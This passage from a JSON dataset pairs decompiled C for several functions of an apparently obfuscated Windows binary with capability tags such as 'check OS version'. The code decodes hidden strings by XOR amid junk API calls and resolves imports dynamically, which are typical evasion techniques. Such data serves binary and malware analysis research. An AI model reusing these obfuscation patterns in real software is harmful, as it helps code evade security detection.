= var_4h;\n    var_28h = 0;\n    iVar6 = (**0x41ccc0)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x00407bfb:\n    if (var_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1210
    },
    "00407c11": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407c11(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    uint32_t var_74h;\n    int32_t *var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0x2723235b;\n    var_44h = 0x2b331b59;\n    var_40h._0_2_ = 0x3527;\n    var_8h = 0x4b475735;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n    var_70h = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_5ch = &var_48h - iVar4;\n    var_60h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar5 != 0xf36b49) {\n            var_10h = 0x5;\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % 5) ^ (iVar11 + iVar4)[var_5ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h = 0x2e21071f;\n    var_ch = 0x6;\n    var_30h._0_1_ = 6;\n    stack0xffffffcd = 0x3217150;\n    var_2bh = 0xc1f0324;\n    var_27h = 0x32e101e;\n    var_23h = 0x1f04240b;\n    var_1fh = 0x37361f2e;\n    var_1bh = 0x224151f;\n    var_17h = 0x76447315;\n    var_8h = 0x41767045;\n    var_4h._0_2_ = 0x6671;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar5 = var_60h;\n        if (iVar6 != 0xef8bee) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41d1fc & 1) == 0) {\n        *0x41d1fc = *0x41d1fc | 1;\n        *0x41d1f8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_60h);\n    }\n    if ((*0x41d1fc & 2) == 0) {\n        *0x41d1fc = *0x41d1fc | 2;\n        *0x41d1f4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f8, iVar4);\n    }\n    if (*0x41d1f8 == 0) {\n        *0x41d1f8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41d1f4 == NULL) {\n        var_34h = 0x2e21071f;\n        var_30h._0_1_ = 6;\n        stack0xffffffcd = 0x3217150;\n        var_2bh = 0xc1f0324;\n        var_27h = 0x32e101e;\n        var_23h = 0x1f04240b;\n        var_1fh = 0x37361f2e;\n        var_1bh = 0x224151f;\n        var_17h = 0x76447315;\n        var_8h = 0x41767045;\n        var_4h._0_2_ = 0x6671;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n            if (iVar5 != 0xef8bee) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41d1f4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f8, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_60h;\n        iVar4 = var_5ch;\n    }\n    fcn.004074d8();\n    if ((*0x41d1f4 != NULL) && (iVar11 = (**0x41d1f4)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.00407a57(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.00407a57(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_68h = *(iVar11 + 0x18) + 0x10;\n                var_44h = *(iVar11 + 0x3c);\n                var_6ch = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_70h + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_68h) || (var_44h != var_6ch)) {\n                    do {\n                        var_54h = fcn.00407a57(iVar11 + 0x68, 0x98);\n                        iVar5 = var_60h;\n                        iVar4 = var_5ch;\n                        if (var_54h == 0) break;\n                        var_48h = *(iVar11 + 0x68);\n                        var_78h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_44h = var_78h;\n                        var_8h = var_48h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_74h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.00407a57(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_8h != var_68h) || (iVar5 = var_60h,  iVar4 = var_5ch,  var_78h != var_6ch));\n                }\n                if (var_70h != NULL) {\n                    *var_70h = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_64h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_64h;\n}\n",
        "token_count": 2925
    },
    "004080d2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004080d2(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41ccc8 | *0x41cccc) != 0) {\ncode_r0x00408491:\n        var_ch = 0x41ccc8;\n        goto code_r0x00408496;\n    }\n    var_30h = 0x2723235b;\n    var_2ch = 0x2b331b59;\n    var_28h._0_2_ = 0x3527;\n    var_24h = 0x4b475735;\n    var_20h._0_1_ = 0x35;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_18h = 5;\n    iVar6 = 0;\n    var_1ch = &var_30h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_1ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_48h._0_2_ = 0x251f;\n    var_48h._2_1_ = 0xe;\n    var_48h._3_1_ = 0x56;\n    var_44h._0_1_ = 0x19;\n    var_44h._1_1_ = 0x29;\n    var_44h._2_1_ = 0x2a;\n    var_44h._3_1_ = 0x3c;\n    var_40h._0_1_ = 0x3d;\n    var_40h._1_1_ = 0x56;\n    var_40h._2_1_ = 0x15;\n    var_40h._3_1_ = 0x1e;\n    var_3ch._0_2_ = 0x3a11;\n    var_3ch._2_1_ = 0x3b;\n    var_3ch._3_1_ = 0x56;\n    var_38h._0_2_ = 0xe0c;\n    var_38h._2_1_ = 0x45;\n    var_2ch = 0x33495245;\n    var_28h._0_2_ = 0x6a6d;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_1ch = 6;\n    iVar6 = 0;\n    var_10h = &var_48h - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        iVar3 = var_8h;\n        if (iVar4 != 0x814416) {\n            *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_10h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41ccc8 = fcn.004085e0(iVar2);\n    if (*0x41ccc8 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x00408206:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_48h._0_2_ = 0x353f;\n        var_48h._2_1_ = 0x24;\n        var_48h._3_1_ = 0x1c;\n        var_44h._0_1_ = 0x17;\n        var_44h._1_1_ = 0x26;\n        var_44h._2_1_ = 0x2d;\n        var_44h._3_1_ = 0x19;\n        var_40h._0_1_ = 0xd;\n        var_40h._1_1_ = 6;\n        var_40h._2_1_ = 0x1d;\n        var_40h._3_1_ = 0x36;\n        var_3ch._0_2_ = 0x1123;\n        var_3ch._2_1_ = 0x11;\n        var_3ch._3_1_ = 0;\n        var_38h._0_2_ = 0x1323;\n        var_38h._2_1_ = 0x79;\n        var_24h = 0x79774265;\n        var_20h._0_1_ = 99;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = &var_48h - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n            iVar3 = var_8h;\n            if (iVar4 != 0xb14417) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41ccd0 = fcn.004085e0(iVar2);\n        iVar2 = var_14h;\n        if (*0x41ccd0 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h._0_2_ = 0x1a09;\n            var_48h._2_1_ = 0x75;\n            var_48h._3_1_ = 0x2a;\n            var_44h._0_1_ = 8;\n            var_44h._1_1_ = 5;\n            var_44h._2_1_ = 4;\n            var_44h._3_1_ = 0x5d;\n            var_40h._0_1_ = 0x3c;\n            var_40h._1_1_ = 0x37;\n            var_40h._2_1_ = 0x35;\n            var_40h._3_1_ = 0x3e;\n            var_3ch._0_2_ = 0x285d;\n            var_3ch._2_1_ = 0xc;\n            var_3ch._3_1_ = 0x3a;\n            var_38h._0_2_ = 0x5602;\n            var_38h._2_1_ = 0x4b;\n            var_2ch = 0x4b386d53;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x78);\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_48h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                iVar3 = var_8h;\n                if (iVar4 != 0x8aee84) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_24h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41ccd8 = fcn.004085e0(iVar2);\n            iVar2 = var_14h;\n            if (*0x41ccd8 != 0) {\n                var_48h._0_2_ = 0x1316;\n                var_48h._2_1_ = 5;\n                var_48h._3_1_ = 0x2c;\n                var_44h._0_1_ = 0x3d;\n                var_44h._1_1_ = 0x50;\n                var_44h._2_1_ = 0x3c;\n                var_44h._3_1_ = 0x32;\n                var_40h._0_1_ = 0x39;\n                var_40h._1_1_ = 0x27;\n                var_40h._2_1_ = 0x27;\n                var_40h._3_1_ = 0x7e;\n                var_3ch._0_2_ = 0x372a;\n                var_3ch._2_1_ = 0x35;\n                var_3ch._3_1_ = 0x21;\n                var_38h._0_2_ = 0x5824;\n                var_38h._2_1_ = 0x23;\n                stack0xffffffc7 = 0x500a;\n                var_2ch = 0x4250644c;\n                var_28h._0_2_ = 0x3150;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_24h = &var_48h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0xf53e10) {\n                        *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_24h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41cce0 = fcn.004085e0(iVar2);\n                if (*0x41cce0 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x00408491;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x00408206;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x00408496:\n    *0x41ccdc = *0x41ccd8 >> 0x20;\n    *0x41cce4 = *0x41cce0 >> 0x20;\n    *0x41ccd4 = *0x41ccd0 >> 0x20;\n    *0x41cccc = *0x41ccc8 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 3205
    },
    "00408761": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00408761(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t lpLibFileName;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_30h = 0x66013836;\n    var_2ch = 0x7156590d;\n    var_28h._0_2_ = 0x6866;\n    lpLibFileName = 0x66713859;\n    var_18h._0_1_ = 0x68;\n    var_20h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_8h = 5;\n    iVar8 = 0;\n    var_14h = &var_30h - iVar3;\n    var_ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x14cd0e) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_8h) ^ (iVar8 + iVar3)[var_14h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_34h = 0x223c211b;\n    var_30h = 0x575b7b79;\n    var_2ch = 0x6924590a;\n    var_14h = 0x6e796948;\n    var_10h._0_1_ = 0x35;\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0x3703e4) {\n            *(iVar8 + iVar3) = *(&var_14h + iVar8 % var_8h) ^ (iVar8 + iVar3)[&var_34h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_34h = 0x201c2509;\n    var_30h = 0x28222826;\n    var_2ch = 0x83e391a;\n    var_28h._0_2_ = 0x4d0d;\n    var_8h = 0x4c794d5a;\n    var_4h._0_2_ = 0x6d4a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_14h = &var_34h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0xc521c2) {\n            var_14h = 6;\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_34h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_ch, var_24h, var_20h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_ch);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1179
    },
    "00408bb1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408bb1(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3bh;\n    ushort var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41ccec | *0x41ccf0) == 0) || ((*0x41ccf4 | *0x41ccf8) == 0)) || ((*0x41ccfc | *0x41cd00) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x2723235b;\n        var_30h = 0x2b331b59;\n        var_2ch._0_2_ = 0x3527;\n        var_24h = 0x4b475735;\n        var_20h._0_1_ = 0x35;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_18h = 5;\n        iVar6 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar3 != 0xf36b49) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[&var_34h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_ch = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_ch == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_40h._0_1_ = 5;\n        stack0xffffffbd = 0x5d2f1d37;\n        var_3bh = 0x3172d19;\n        var_37h = 0x320f;\n        var_30h = 0x636f5349;\n        var_2ch._0_2_ = 0x7832;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_1ch = 6;\n        iVar6 = 0;\n        var_14h = iVar2;\n        var_8h = &var_40h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            if (iVar3 != 0x957e94) {\n                *(iVar6 + iVar2) = *(&var_30h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[&var_40h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xb);\n        *0x41ccec = fcn.004077d7();\n        iVar6 = var_10h;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41ccf0 = *0x41ccec >> 0x1f;\n        if ((*0x41ccec | *0x41ccf0) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_58h = 0x1e073522;\n            var_54h = 0x7011a50;\n            var_50h = 0x350b5636;\n            var_4ch = 0x2f502b00;\n            var_48h = 0x502b1135;\n            var_44h._0_2_ = 0x221d;\n            var_44h._2_1_ = 0x75;\n            var_30h = 0x5975516e;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x35);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_58h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                if (iVar3 != 0xd32a2c) {\n                    *(iVar6 + iVar2) = *(&var_30h + iVar6 % var_18h) ^ (iVar6 + iVar2)[&var_58h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41ccf4 = fcn.004077d7();\n            iVar6 = var_10h;\n            iVar2 = var_14h;\n            *0x41ccf8 = *0x41ccf4 >> 0x1f;\n            if ((*0x41ccf4 | *0x41ccf8) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar4)(uVar1);\n                uVar1 = (*pcVar7)(0, iVar6);\n                (*pcVar4)(uVar1);\n                return var_4h;\n            }\n            var_58h = 0x1f66022a;\n            var_54h = 0x16153758;\n            var_50h = 0x315e3b42;\n            var_4ch = 0x1570004;\n            var_48h = 0x1a1d267a;\n            var_44h._0_2_ = 0x1444;\n            var_44h._2_1_ = 0x37;\n            var_30h = 0x6d367570;\n            var_2ch._0_2_ = 0x4337;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_58h - iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n                if (iVar3 != 0x1ad77c) {\n                    *(iVar6 + iVar2) = *(&var_30h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[&var_58h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41ccfc = fcn.004077d7();\n            iVar6 = var_10h;\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41cd00 = *0x41ccfc >> 0x1f;\n            if ((*0x41ccfc | *0x41cd00) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, var_8h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, var_14h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar6);\n                (*pcVar7)(uVar1);\n                goto code_r0x00408eef;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            